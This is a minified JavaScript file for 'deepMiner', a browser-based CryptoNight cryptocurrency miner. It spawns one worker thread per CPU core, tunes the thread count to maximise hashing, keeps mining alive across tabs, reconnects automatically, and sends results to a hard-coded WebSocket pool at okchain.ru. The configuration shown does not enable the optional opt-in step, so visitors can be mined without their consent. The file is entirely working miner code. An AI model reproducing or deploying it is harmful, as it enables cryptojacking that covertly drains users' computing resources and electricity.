(function(t){"use strict";var e=function(e,s){s=s||{};this._siteKey=e;this._user=null;this._threads=[];this._hashes=0;this._currentJob=null;this._autoReconnect=true;this._reconnectRetry=3;this._tokenFromServer=null;this._goal=0;this._totalHashesFromDeadThreads=0;this._throttle=Math.max(0,Math.min(.99,s.throttle||0));this._autoThreads={enabled:!!s.autoThreads,interval:null,adjustAt:null,adjustEvery:1e4,stats:{}};this._tab={ident:Math.random()*16777215|0,mode:deepMiner.IF_EXCLUSIVE_TAB,grace:0,lastPingReceived:0,interval:null};if(t.BroadcastChannel){try{this._bc=new BroadcastChannel("deepMiner");this._bc.onmessage=function(t){if(t.data==="ping"){this._tab.lastPingReceived=Date.now()}}.bind(this)}catch(t){}}this._eventListeners={open:[],authed:[],close:[],error:[],job:[],found:[],accepted:[]};var i=navigator.hardwareConcurrency||4;this._targetNumThreads=s.threads||i;this._useWASM=this.hasWASMSupport()&&!s.forceASMJS;this._asmjsStatus="unloaded";this._onTargetMetBound=this._onTargetMet.bind(this);this._onVerifiedBound=this._onVerified.bind(this)};e.prototype.start=function(e){this._tab.mode=e||deepMiner.IF_EXCLUSIVE_TAB;if(this._tab.interval){clearInterval(this._tab.interval);this._tab.interval=null}var s=new XMLHttpRequest;if(this._useWASM||this._asmjsStatus==="loaded"){s.addEventListener("load",function(){deepMiner.CRYPTONIGHT_WORKER_BLOB=t.URL.createObjectURL(new Blob([s.responseText]));this._asmjsStatus="loaded";this._startNow()}.bind(this),s);s.open("get","/w.js",true);s.send()}else if(this._asmjsStatus==="unloaded"){this._asmjsStatus="pending";s.addEventListener("load",function(){deepMiner.CRYPTONIGHT_WORKER_BLOB=t.URL.createObjectURL(new Blob([s.responseText]));this._asmjsStatus="loaded";this._startNow()}.bind(this),s);s.open("get",deepMiner.CONFIG.LIB_URL+"cna.js",true);s.send()}};e.prototype.stop=function(t){for(var e=0;e<this._threads.length;e++){this._totalHashesFromDeadThreads+=this._threads[e].hashesTotal;this._threads[e].stop()}this._threads=[];this._autoReconnect=false;if(this._socket){this._socket.close()}this._currentJob=null;if(this._autoThreads.interval){clearInterval(this._autoThreads.interval);this._autoThreads.interval=null}if(this._tab.interval&&t!=="dontKillTabUpdate"){clearInterval(this._tab.interval);this._tab.interval=null}};e.prototype.getHashesPerSecond=function(){var t=0;for(var e=0;e<this._threads.length;e++){t+=this._threads[e].hashesPerSecond}return t};e.prototype.getTotalHashes=function(t){var e=Date.now();var s=this._totalHashesFromDeadThreads;for(var i=0;i<this._threads.length;i++){var r=this._threads[i];s+=r.hashesTotal;if(t){var n=(e-r.lastMessageTimestamp)/1e3*.9;s+=n*r.hashesPerSecond}}return s|0};e.prototype.getAcceptedHashes=function(){return this._hashes};e.prototype.getToken=function(){return this._tokenFromServer};e.prototype.on=function(t,e){if(this._eventListeners[t]){this._eventListeners[t].push(e)}};e.prototype.getAutoThreadsEnabled=function(t){return this._autoThreads.enabled};e.prototype.setAutoThreadsEnabled=function(t){this._autoThreads.enabled=!!t;if(!t&&this._autoThreads.interval){clearInterval(this._autoThreads.interval);this._autoThreads.interval=null}if(t&&!this._autoThreads.interval){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;this._autoThreads.interval=setInterval(this._adjustThreads.bind(this),1e3)}};e.prototype.getThrottle=function(){return this._throttle};e.prototype.setThrottle=function(t){this._throttle=Math.max(0,Math.min(.99,t));if(this._currentJob){this._setJob(this._currentJob)}};e.prototype.getNumThreads=function(){return this._targetNumThreads};e.prototype.setNumThreads=function(t){var t=Math.max(1,t|0);this._targetNumThreads=t;if(t>this._threads.length){for(var e=0;t>this._threads.length;e++){var s=new deepMiner.JobThread;if(this._currentJob){s.setJob(this._currentJob,this._onTargetMetBound)}this._threads.push(s)}}else if(t<this._threads.length){while(t<this._threads.length){var s=this._threads.pop();this._totalHashesFromDeadThreads+=s.hashesTotal;s.stop()}}};e.prototype.hasWASMSupport=function(){return t.WebAssembly!==undefined};e.prototype.isRunning=function(){return this._threads.length>0};e.prototype._startNow=function(){if(this._tab.mode!==deepMiner.FORCE_MULTI_TAB&&!this._tab.interval){this._tab.interval=setInterval(this._updateTabs.bind(this),1e3)}if(this._tab.mode===deepMiner.IF_EXCLUSIVE_TAB&&this._otherTabRunning()){return}if(this._tab.mode===deepMiner.FORCE_EXCLUSIVE_TAB){this._tab.grace=Date.now()+3e3}if(!this.verifyThread){this.verifyThread=new deepMiner.JobThread}this.setNumThreads(this._targetNumThreads);this._autoReconnect=true;if(deepMiner.CONFIG.REQUIRES_AUTH){this._auth=this._auth||new deepMiner.Auth(this._siteKey);this._auth.auth(function(t){if(!t){return this._emit("error",{error:"opt_in_canceled"})}this._optInToken=t;this._connect()}.bind(this))}else{this._connect()}};e.prototype._otherTabRunning=function(){if(this._tab.lastPingReceived>Date.now()-1500){return true}try{var t=localStorage.getItem("deepMiner");if(t){var e=JSON.parse(t);if(e.ident!==this._tab.ident&&Date.now()-e.time<1500){return true}}}catch(t){}return false};e.prototype._updateTabs=function(){var t=this._otherTabRunning();if(t&&this.isRunning()&&Date.now()>this._tab.grace){this.stop("dontKillTabUpdate")}else if(!t&&!this.isRunning()){this._startNow()}if(this.isRunning()){if(this._bc){this._bc.postMessage("ping")}try{localStorage.setItem("deepMiner",JSON.stringify({ident:this._tab.ident,time:Date.now()}))}catch(t){}}};e.prototype._adjustThreads=function(){var t=this.getHashesPerSecond();var e=this.getNumThreads();var s=this._autoThreads.stats;s[e]=s[e]?s[e]*.5+t*.5:t;if(Date.now()>this._autoThreads.adjustAt){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;var i=(s[e]||0)-1;var r=s[e+1]||0;var n=s[e-1]||0;if(i>n&&(r===0||r>i)&&e<8){return this.setNumThreads(e+1)}else if(i>r&&(!n||n>i)&&e>1){return this.setNumThreads(e-1)}}};e.prototype._emit=function(t,e){var s=this._eventListeners[t];if(s&&s.length){for(var i=0;i<s.length;i++){s[i](e)}}};e.prototype._hashString=function(t){var e=5381,s=t.length;while(s){e=e*33^t.charCodeAt(--s)}return e>>>0};e.prototype._connect=function(){if(this._socket){return}var t=deepMiner.CONFIG.WEBSOCKET_SHARDS;var e=this._hashString(this._siteKey)%t.length;var s=t[e];var i=s[Math.random()*s.length|0];this._socket=new WebSocket(i);this._socket.onmessage=this._onMessage.bind(this);this._socket.onerror=this._onError.bind(this);this._socket.onclose=this._onClose.bind(this);this._socket.onopen=this._onOpen.bind(this)};e.prototype._onOpen=function(t){this._emit("open");var e={site_key:this._siteKey,type:"anonymous",user:null,goal:0};if(this._user){e.type="user";e.user=this._user.toString()}else if(this._goal){e.type="token";e.goal=this._goal}if(this._optInToken){e.opt_in=this._optInToken}this._send("auth",e)};e.prototype._onError=function(t){this._emit("error",{error:"connection_error"});this._onClose(t)};e.prototype._onClose=function(t){if(t.code>=1003&&t.code<=1009){this._reconnectRetry=60}for(var e=0;e<this._threads.length;e++){this._threads[e].stop()}this._threads=[];this._socket=null;this._emit("close");if(this._autoReconnect){setTimeout(this._startNow.bind(this),this._reconnectRetry*1e3)}};e.prototype._onMessage=function(t){var e=JSON.parse(t.data);if(e.type==="job"){this._setJob(e.params);this._emit("job",e.params);if(this._autoThreads.enabled&&!this._autoThreads.interval){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;this._autoThreads.interval=setInterval(this._adjustThreads.bind(this),1e3)}}else if(e.type==="verify"){this.verifyThread.verify(e.params,this._onVerifiedBound)}else if(e.type==="hash_accepted"){this._hashes=e.params.hashes;this._emit("accepted",e.params);if(this._goal&&this._hashes>=this._goal){this.stop()}}else if(e.type==="authed"){this._tokenFromServer=e.params.token||null;this._hashes=e.params.hashes||0;this._emit("authed",e.params);this._reconnectRetry=3}else if(e.type==="error"){if(console&&console.error){console.error("deepMiner Error:",e.params.error)}this._emit("error",e.params);if(e.params.error==="invalid_site_key"){this._reconnectRetry=6e3}else if(e.params.error==="invalid_opt_in"){if(this._auth){this._auth.reset()}}}else if(e.type==="banned"||e.params.banned){this._emit("error",{banned:true});this._reconnectRetry=600}};e.prototype._setJob=function(t){this._currentJob=t;this._currentJob.throttle=this._throttle;for(var e=0;e<this._threads.length;e++){this._threads[e].setJob(t,this._onTargetMetBound)}};e.prototype._onTargetMet=function(t){this._emit("found",t);if(t.job_id===this._currentJob.job_id){this._send("submit",{job_id:t.job_id,nonce:t.nonce,result:t.result})}};e.prototype._onVerified=function(t){this._send("verified",t)};e.prototype._send=function(t,e){if(!this._socket){return}var s={type:t,params:e||{}};this._socket.send(JSON.stringify(s))};t.deepMiner=t.deepMiner||{};t.deepMiner.IF_EXCLUSIVE_TAB="ifExclusiveTab";t.deepMiner.FORCE_EXCLUSIVE_TAB="forceExclusiveTab";t.deepMiner.FORCE_MULTI_TAB="forceMultiTab";t.deepMiner.Token=function(t,s,i){var r=new e(t,i);r._goal=s||0;return r};t.deepMiner.User=function(t,s,i){var r=new e(t,i);r._user=s;return r};t.deepMiner.Anonymous=function(t,s){var i=new e(t,s);return i}})(window);(function(t){"use strict";var e=function(){this.worker=new Worker(deepMiner.CRYPTONIGHT_WORKER_BLOB);this.worker.onmessage=this.onReady.bind(this);this.currentJob=null;this.jobCallback=function(){};this.verifyCallback=function(){};this._isReady=false;this.hashesPerSecond=0;this.hashesTotal=0;this.running=false;this.lastMessageTimestamp=Date.now()};e.prototype.onReady=function(t){if(t.data!=="ready"||this._isReady){throw'Expecting first message to be "ready", got '+t}this._isReady=true;this.worker.onmessage=this.onReceiveMsg.bind(this);if(this.currentJob){this.running=true;this.worker.postMessage(this.currentJob)}};e.prototype.onReceiveMsg=function(t){if(t.data.verify_id){this.verifyCallback(t.data);return}if(t.data.result){this.jobCallback(t.data)}this.hashesPerSecond=this.hashesPerSecond*.5+t.data.hashesPerSecond*.5;this.hashesTotal+=t.data.hashes;this.lastMessageTimestamp=Date.now();if(this.running){this.worker.postMessage(this.currentJob)}};e.prototype.setJob=function(t,e){this.currentJob=t;this.jobCallback=e;if(this._isReady&&!this.running){this.running=true;this.worker.postMessage(this.currentJob)}};e.prototype.verify=function(t,e){if(!this._isReady){return}this.verifyCallback=e;this.worker.postMessage(t)};e.prototype.stop=function(){if(this.worker){this.worker.terminate();this.worker=null}this.running=false};t.deepMiner.JobThread=e})(window);self.deepMiner=self.deepMiner||{};self.deepMiner.CONFIG={WEBSOCKET_SHARDS:[["ws://okchain.ru:7777/proxy"]]};